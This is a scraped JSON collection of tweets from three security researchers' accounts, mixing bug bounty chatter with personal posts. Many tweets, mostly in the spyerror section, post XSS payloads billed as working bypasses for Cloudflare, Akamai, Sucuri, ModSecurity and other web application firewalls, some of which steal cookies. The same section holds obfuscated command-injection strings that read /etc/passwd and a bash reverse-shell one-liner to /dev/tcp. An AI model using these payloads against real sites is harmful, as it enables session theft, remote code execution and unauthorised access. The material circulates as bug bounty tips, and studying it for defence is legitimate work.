{"h1_kenan": [{"title": "found that! 02/02/2017 09:21:42 got an email from @Hacker0x01pic.twitter.com/yLyhjnLm1L", "link": "https://twitter.com/h1_kenan/status/1162477689632169996", "pub_date": "2019-08-17", "source": "https://twitter.com/h1_kenan", "tweet_id": "1162477689632169996"}, {"title": "KONA #WAF #bypass\n#XSS #bugbountytip \n\nasd\"on+<>+onpointerenter%3d\"x%3dconfirm,x(cookie)\n\nenjoy", "link": "https://twitter.com/h1_kenan/status/1185826172308983808", "pub_date": "2019-10-20", "source": "https://twitter.com/h1_kenan", "tweet_id": "1185826172308983808"}, {"title": "Chrome 78 to remove XSS Auditor just 4 days away!\n\nGoodbye \"Firefox Only\" xss vectors! #bugbounty", "link": "https://twitter.com/superevr/status/1185256166311563264", "pub_date": "2019-10-19", "source": "https://twitter.com/h1_kenan", "tweet_id": "1185256166311563264"}, {"title": "special thanks to my friend and awesome hacker @zseanopic.twitter.com/4Jlj6PPcZE", "link": "https://twitter.com/h1_kenan/status/1185451354233491456", "pub_date": "2019-10-19", "source": "https://twitter.com/h1_kenan", "tweet_id": "1185451354233491456"}, {"title": "so We(me & @securityidiots) sat down together and wrote all we knew  about XXE. Nothing new but could be a great reference for beginners. \n\nhttps://securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html\u00a0\u2026https://twitter.com/securityidiots/status/1184534859059998721\u00a0\u2026", "link": "https://twitter.com/iamnoooob/status/1184553158401347584", "pub_date": "2019-10-17", "source": "https://twitter.com/h1_kenan", "tweet_id": "1184553158401347584"}, {"title": "thank you my friend https://twitter.com/fng/status/1184670279097712646\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1184690858509119488", "pub_date": "2019-10-17", "source": "https://twitter.com/h1_kenan", "tweet_id": "1184690858509119488"}, {"title": "as if they don't pay for them", "link": "https://twitter.com/h1_kenan/status/1184565767557275652", "pub_date": "2019-10-17", "source": "https://twitter.com/h1_kenan", "tweet_id": "1184565767557275652"}, {"title": "wtf is that some companies say we work with bugcrowd or synack but we don't have monetary awards? bullshit", "link": "https://twitter.com/h1_kenan/status/1184559430072963079", "pub_date": "2019-10-17", "source": "https://twitter.com/h1_kenan", "tweet_id": "1184559430072963079"}, {"title": "AMA is over, people still asking my age and how to recon. I'm 43 and everybody has different recon process. check them all and get yourself your own.", "link": "https://twitter.com/h1_kenan/status/1183419344140812288", "pub_date": "2019-10-14", "source": "https://twitter.com/h1_kenan", "tweet_id": "1183419344140812288"}, {"title": "somebody stop Robbie!https://twitter.com/Random_Robbie/status/1182981498900766723\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1182982942441783296", "pub_date": "2019-10-12", "source": "https://twitter.com/h1_kenan", "tweet_id": "1182982942441783296"}, {"title": "please stop by now, we will continue later, and before asking read the thread, someone else maybe askedhttps://twitter.com/h1_kenan/status/1182334352069419009\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1182538510865195008", "pub_date": "2019-10-11", "source": "https://twitter.com/h1_kenan", "tweet_id": "1182538510865195008"}, {"title": "i really enjoyed it, thanks for asking.. let's continue later https://twitter.com/h1_kenan/status/1182334352069419009\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1182348967507582976", "pub_date": "2019-10-11", "source": "https://twitter.com/h1_kenan", "tweet_id": "1182348967507582976"}, {"title": "you can ask me anything, how old are you, where to start, about bug bounty, what you wonder..", "link": "https://twitter.com/h1_kenan/status/1182334352069419009", "pub_date": "2019-10-11", "source": "https://twitter.com/h1_kenan", "tweet_id": "1182334352069419009"}, {"title": "hackerone has security check feature, please note: \"for selected hackers only\" \nhttps://docs.hackerone.com/hackers/security-checks.html\u00a0\u2026\n#togetherweselectharder", "link": "https://twitter.com/h1_kenan/status/1181957116426440704", "pub_date": "2019-10-09", "source": "https://twitter.com/h1_kenan", "tweet_id": "1181957116426440704"}, {"title": "hated iphone and apple, even can't transfer my photos to my pc, support didn't know the solution, I don't use icloud and I won't.https://twitter.com/h1_kenan/status/1179125680535199745\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1179476883978817536", "pub_date": "2019-10-03", "source": "https://twitter.com/h1_kenan", "tweet_id": "1179476883978817536"}, {"title": "hey @Apple @AppleSupport do some better things not emogies, in every update i see another problem..", "link": "https://twitter.com/h1_kenan/status/1179125680535199745", "pub_date": "2019-10-02", "source": "https://twitter.com/h1_kenan", "tweet_id": "1179125680535199745"}, {"title": "company funding itselfhttps://twitter.com/disclosedh1/status/1179078599896436736\u00a0\u2026", "link": "https://twitter.com/h1_kenan/status/1179085260052672513", "pub_date": "2019-10-02", "source": "https://twitter.com/h1_kenan", "tweet_id": "1179085260052672513"}, {"title": "It was such a pleasure hanging out with @h1_kenan in Eskisehir  definitely lots of fun talking and catching up on bug bounty topics over a nice sunset view. Thank you for the invite/gift, and safe travels back home!pic.twitter.com/1UG6YjZd2b", "link": "https://twitter.com/Yassineaboukir/status/1178015249175367680", "pub_date": "2019-09-29", "source": "https://twitter.com/h1_kenan", "tweet_id": "1178015249175367680"}, {"title": "said thanks to my family first of course", "link": "https://twitter.com/h1_kenan/status/1177625434416144385", "pub_date": "2019-09-28", "source": "https://twitter.com/h1_kenan", "tweet_id": "1177625434416144385"}, {"title": "I never quit, struggled, my brother @brutelogic told me one day your time will come. special thanks to him, and all my friends. <3pic.twitter.com/DzQ3yLEl7g", "link": "https://twitter.com/h1_kenan/status/1177583001498263553", "pub_date": "2019-09-27", "source": "https://twitter.com/h1_kenan", "tweet_id": "1177583001498263553"}, {"title": "found a parameter displaying clients info, reported. developers changed the parameter name as a fix, I didn't know that time. found the new name, send another report  \nhow can one think, changing parameter name makes it secure?", "link": "https://twitter.com/h1_kenan/status/1177483878354653186", "pub_date": "2019-09-27", "source": "https://twitter.com/h1_kenan", "tweet_id": "1177483878354653186"}], "spyerror": [{"title": "I'm not lazy, I'm just one enegy saving mode.", "link": "https://twitter.com/spyerror/status/1176592130745282561", "pub_date": "2019-09-25", "source": "https://twitter.com/spyerror", "tweet_id": "1176592130745282561"}, {"title": "\u00ab http://waf.m.workers.dev/?x=%3Cbody/\u00a0\\%3C/onscroll/=1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))%3E\nTry this one.  dot shot.  \u00bb\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1185428827348099072", "pub_date": "2019-10-19", "source": "https://twitter.com/spyerror", "tweet_id": "1185428827348099072"}, {"title": "cloudflare \u00abXSS\u00bb payload to bypass protection. \n\n{` <body \\< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))> \u00b4}\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1185427746010386432", "pub_date": "2019-10-19", "source": "https://twitter.com/spyerror", "tweet_id": "1185427746010386432"}, {"title": "CloudFront ~`XSS\u00b4 payload, shake dice. \n\n <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1179444600404152321", "pub_date": "2019-10-03", "source": "https://twitter.com/spyerror", "tweet_id": "1179444600404152321"}, {"title": "Sucuri >_`xss\u00b4 payload, dot antidote. \n\n$ \"><svg/onload={-+-+-+-+-+-+-+-+-[alert`1`]}>\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1177685613329424384", "pub_date": "2019-09-28", "source": "https://twitter.com/spyerror", "tweet_id": "1177685613329424384"}, {"title": "ModSecurity { XSS } Detection Bypass; \n\n{ 1 }; <img src=x:alert(alt) onerror=eval(src) alt='spyerror'>\n{ 2 }; \"></tag><svg onload=alert(spyerror)>\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1168414139401887744", "pub_date": "2019-09-02", "source": "https://twitter.com/spyerror", "tweet_id": "1168414139401887744"}, {"title": "CloudFlare {\"HTML TO XSS\"}; ~byPass Detected. \n\n[\" <style>@KeyFrames\n z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E \"</script> \"]\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1166146256231682049", "pub_date": "2019-08-27", "source": "https://twitter.com/spyerror", "tweet_id": "1166146256231682049"}, {"title": "Sucuri {` XSS \u00b4}; payloads `appeared fresh, confirmed.\u00b4 \u21ad\n\nActive </1>;  \"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n\nActive </2>;  <;br size=\\\";&;{alert(&#039;XSS&#039;)}\\\";>;\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1164789676944658432", "pub_date": "2019-08-23", "source": "https://twitter.com/spyerror", "tweet_id": "1164789676944658432"}, {"title": "ModSecurity {\" XSS \"} ~Bypass braindeath; \u24fe\n\n~1; \" %3Cspyerror%20script%20goes%20here%3E=%0AByPass \"\n~2; \"%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E\" \n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1164264620833562625", "pub_date": "2019-08-22", "source": "https://twitter.com/spyerror", "tweet_id": "1164264620833562625"}, {"title": "{XSS}; CloudFront Bypass, dot shot. \n\n~/1~ <iframe/onload='this[\"src\"]=\"jav\"+\"as&Tab;cr\"+\"ipt:al\"+\"er\"+\"t()\"';>\n\n~/2~\n<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1163800086876499970", "pub_date": "2019-08-20", "source": "https://twitter.com/spyerror", "tweet_id": "1163800086876499970"}, {"title": "\"Cloudflare\"; live payloads: \n\n~1: &lt;img longdesc=\"src='x'onerror=alert(document.domain);//&gt;&lt;img \" src='showme'&gt;\n\n~2: &lt;img longdesc=\"src=\" images=\"\" stop.png\"=\"\" onerror=\"alert(document.domain);//&amp;quot;\" src=\"x\" alt=\"showme\"&gt;\n\n#BugBounty #BugBountyTip #WAF", "link": "https://twitter.com/spyerror/status/1163093543503749120", "pub_date": "2019-08-18", "source": "https://twitter.com/spyerror", "tweet_id": "1163093543503749120"}, {"title": "Sucuri { RCE }; payloads, dot shot. \n\nSmuggling RCE Payloads:\n</> /???/??t+/???/??ss?? </>\n\nObfuscating RCE Payloads:\n</> ;+cat+/e'tc/pass'wd </>\n</> c\\\\a\\\\t+/et\\\\c/pas\\\\swd </>\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1163008437485232129", "pub_date": "2019-08-18", "source": "https://twitter.com/spyerror", "tweet_id": "1163008437485232129"}, {"title": "ModSecurity { RCE } Detection Bypass \n\n{ 1 }; ;+$u+cat+/etc$u/passwd$u\n{ 2 }; ;+$u+cat+/etc$u/passwd+\\#\n\n#BugBounty #BugBountyTip #WAF #infosec", "link": "https://twitter.com/spyerror/status/1162826904833089541", "pub_date": "2019-08-18", "source": "https://twitter.com/spyerror", "tweet_id": "1162826904833089541"}, {"title": "</>Cloudflare skip filters, ~XSS Bypass via dot.\n\n<div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">X\n\n#WAF #BugBounty #BugBountyTip #infosec", "link": "https://twitter.com/spyerror/status/1161432029319376897", "pub_date": "2019-08-14", "source": "https://twitter.com/spyerror", "tweet_id": "1161432029319376897"}, {"title": "Finding was closed, no return. @YoncuBilisim\n#WAF #BugBounty #BugBountyTip #infosecpic.twitter.com/eoVvedJriy", "link": "https://twitter.com/spyerror/status/1160218121413812225", "pub_date": "2019-08-10", "source": "https://twitter.com/spyerror", "tweet_id": "1160218121413812225"}, {"title": "{ Cloudflare }; ~ XSS Bypass: \n\n</Scrpt/\"%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>\n\n#BugBounty #WAF #BugBountyTip #infosec", "link": "https://twitter.com/spyerror/status/1160217343953395717", "pub_date": "2019-08-10", "source": "https://twitter.com/spyerror", "tweet_id": "1160217343953395717"}, {"title": "#blindrce turn it in to a { reverse shell! } \n\n|`bash -i >& /dev/tcp/yourip/yourport 0>&1`\n\n#bugbounty #bugbountytip #waf #infosec", "link": "https://twitter.com/spyerror/status/1159764049728606208", "pub_date": "2019-08-09", "source": "https://twitter.com/spyerror", "tweet_id": "1159764049728606208"}, {"title": "XSS { Cloudfare } bypass: \n\n</> \" <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'> \" </>\n\n#WAF #BugBounty #BugBountyTip #infosec", "link": "https://twitter.com/spyerror/status/1159091868917010432", "pub_date": "2019-08-07", "source": "https://twitter.com/spyerror", "tweet_id": "1159091868917010432"}, {"title": "Bypass 405 Alibaba { WAF }; \n\nwith onloadstart/end and encode the parenthesis,\n\n/* <audio src=1 onloadstart=alert&lpar;1&rpar;//> */\n\n#WAF #BugBounty #BugBountyTip #infosec", "link": "https://twitter.com/spyerror/status/1158729847360933888", "pub_date": "2019-08-06", "source": "https://twitter.com/spyerror", "tweet_id": "1158729847360933888"}, {"title": "Exactly this \n#WAF #BugBounty #BugBountyTip #infosecpic.twitter.com/RPfTOEfvU9", "link": "https://twitter.com/spyerror/status/1157959327237529600", "pub_date": "2019-08-04", "source": "https://twitter.com/spyerror", "tweet_id": "1157959327237529600"}], "stueotue": [{"title": "cough \"MiLLiTaRy gRadE\" coughhttps://twitter.com/NathOnSecurity/status/1186419430256824321\u00a0\u2026", "link": "https://twitter.com/stueotue/status/1186456378665078784", "pub_date": "2019-10-22", "source": "https://twitter.com/stueotue", "tweet_id": "1186456378665078784"}, {"title": "Infosec students! If you want to do a security internship at Google ZRH or US next year apply here until October 31:\n\nhttps://careers.google.com/jobs/results/78649790948090566-security-engineer-intern-summer-2020/?company=Google&company=Google%20Fiber&company=YouTube&employment_type=FULL_TIME&hl=en_US&jlo=en_US&q=security%20engineer%20intern&sort_by=relevance\u00a0\u2026\nhttps://careers.google.com/jobs/results/89031994454745798-security-engineer-intern-2020/?category=DATA_CENTER_OPERATIONS&category=DEVELOPER_RELATIONS&category=HARDWARE_ENGINEERING&category=INFORMATION_TECHNOLOGY&category=MANUFACTURING_SUPPLY_CHAIN&category=NETWORK_ENGINEERING&category=PRODUCT_MANAGEMENT&category=PROGRAM_MANAGEMENT&category=SOFTWARE_ENGINEERING&category=TECHNICAL_INFRASTRUCTURE_ENGINEERING&category=TECHNICAL_SOLUTIONS&category=TECHNICAL_WRITING&category=USER_EXPERIENCE&company=Google&company=YouTube&employment_type=INTERN&jex=ENTRY_LEVEL&q=security%20engineer%20intern\u00a0\u2026", "link": "https://twitter.com/fel1x/status/1186232997797908480", "pub_date": "2019-10-21", "source": "https://twitter.com/stueotue", "tweet_id": "1186232997797908480"}, {"title": "On Twitter, if you blink at the wrong moment you'll miss some great web security research. We recently launched a quality-over-quantity subreddit to help address this:https://www.reddit.com/r/websecurityresearch\u00a0\u2026", "link": "https://twitter.com/PortSwiggerRes/status/1186271855650508800", "pub_date": "2019-10-21", "source": "https://twitter.com/stueotue", "tweet_id": "1186271855650508800"}, {"title": "Note to self: true long term happiness comes from within, not from external sources, stuff, status or competition. If no one was around what would you do? You are the creator of your own reality, follow your hearts desires, you got this! #selflove", "link": "https://twitter.com/stokfredrik/status/1185876545086341120", "pub_date": "2019-10-20", "source": "https://twitter.com/stueotue", "tweet_id": "1185876545086341120"}, {"title": "So I saw this video on TikTokpic.twitter.com/1rwZzk1Uve", "link": "https://twitter.com/iAmYart/status/1184895499209527296", "pub_date": "2019-10-18", "source": "https://twitter.com/stueotue", "tweet_id": "1184895499209527296"}, {"title": "Nobody :\nPengkhotbah : Ini pun kesia-siaan dan usaha menjaring angin.", "link": "https://twitter.com/stueotue/status/1185167070637350914", "pub_date": "2019-10-18", "source": "https://twitter.com/stueotue", "tweet_id": "1185167070637350914"}, {"title": "Cukup utk reaksi endoterm karena kalornya udh mulai kerasa. Takutnya berubah fasa lagi.", "link": "https://twitter.com/stueotue/status/1184778564580757504", "pub_date": "2019-10-17", "source": "https://twitter.com/stueotue", "tweet_id": "1184778564580757504"}, {"title": "Hey wanna hear a five word horror storypic.twitter.com/lZvbD023mz", "link": "https://twitter.com/illty_/status/1184024108209754112", "pub_date": "2019-10-15", "source": "https://twitter.com/stueotue", "tweet_id": "1184024108209754112"}, {"title": "Signs you need a break:\n* loosing interesting in things you\u2019re usually passionate about and bring you joy\n* short temper and easy to provoke\n* taking everything personally\n* constant overthinking\n* emotionally overwhelmed\n* always exhausted/tired\n\nTake care friends. Take a break.", "link": "https://twitter.com/alexmuench/status/1184117437500837888", "pub_date": "2019-10-15", "source": "https://twitter.com/stueotue", "tweet_id": "1184117437500837888"}, {"title": "Ever wondered what lies beneath that cool looking chip on your bank card? What does it do? Why is it there?\nWell here's a little pointless thread that delves into the magic using my @monzo card as an examplepic.twitter.com/DM1MUNtwZ0", "link": "https://twitter.com/dcuthbert/status/1181522099887906818", "pub_date": "2019-10-08", "source": "https://twitter.com/stueotue", "tweet_id": "1181522099887906818"}, {"title": "Akamai WAF Bypass (no character filtering)\n\n<svg onauxclick='a=alert;b=document;a(b.domain)'>\n\n#bugbountytips", "link": "https://twitter.com/stueotue/status/1183282054835793920", "pub_date": "2019-10-13", "source": "https://twitter.com/stueotue", "tweet_id": "1183282054835793920"}, {"title": "How much you think you know vs how much you actually knowpic.twitter.com/wBj4vY2hU7", "link": "https://twitter.com/malwareunicorn/status/1182703288828870656", "pub_date": "2019-10-12", "source": "https://twitter.com/stueotue", "tweet_id": "1182703288828870656"}, {"title": "Di sisi lain dpe getaran keren :vhttps://twitter.com/infoBMKG/status/1183072940205563906\u00a0\u2026", "link": "https://twitter.com/stueotue/status/1183074129441783808", "pub_date": "2019-10-13", "source": "https://twitter.com/stueotue", "tweet_id": "1183074129441783808"}, {"title": "Reverse Engineering Intellectual Property: Chip Ptychographic X-ray Laminographyhttps://securityboulevard.com/2019/10/reverse-engineering-intellectual-property-chip-ptychographic-x-ray-laminography/\u00a0\u2026", "link": "https://twitter.com/Dinosn/status/1181414317138337792", "pub_date": "2019-10-08", "source": "https://twitter.com/stueotue", "tweet_id": "1181414317138337792"}, {"title": "Firefox uXSS leading to RCE: excellent writeup by @freddybhttp://bit.ly/2oCTo0A", "link": "https://twitter.com/XssPayloads/status/1178672926960304128", "pub_date": "2019-09-30", "source": "https://twitter.com/stueotue", "tweet_id": "1178672926960304128"}, {"title": "Keknya ane kena..https://twitter.com/TheHackersNews/status/1178234670703472640\u00a0\u2026", "link": "https://twitter.com/stueotue/status/1178509219395338240", "pub_date": "2019-09-30", "source": "https://twitter.com/stueotue", "tweet_id": "1178509219395338240"}, {"title": "[1/n] Practical walkthrough on how I found an XSS injection and used @PortSwigger @garethheyes XSS cheatsheet to bypass a WAF on a @Hacker0x01 program recently:", "link": "https://twitter.com/spaceraccoonsec/status/1177877957844459520", "pub_date": "2019-09-28", "source": "https://twitter.com/stueotue", "tweet_id": "1177877957844459520"}, {"title": "mungkin sudah masuk poin 2.\n\npasal 68-70, memungkinkan pengembang open source terkait security jadi ikut bersalah. karena penggunaan tools utk mengganggu keamanan, si pembuatnya bisa kena pasal.\n\npadahal seringnya tools dibikin bukan buat merusak, kadang riset.", "link": "https://twitter.com/lantip/status/1176865216442712066", "pub_date": "2019-09-25", "source": "https://twitter.com/stueotue", "tweet_id": "1176865216442712066"}, {"title": "WTF ?https://twitter.com/DamarJuniarto/status/1176862006005002240\u00a0\u2026", "link": "https://twitter.com/stueotue/status/1177222072826654720", "pub_date": "2019-09-26", "source": "https://twitter.com/stueotue", "tweet_id": "1177222072826654720"}, {"title": "ada blademail dia pakhttps://twitter.com/MSyaf7/status/1177193191482593280\u00a0\u2026", "link": "https://twitter.com/stueotue/status/1177199849751502850", "pub_date": "2019-09-26", "source": "https://twitter.com/stueotue", "tweet_id": "1177199849751502850"}]}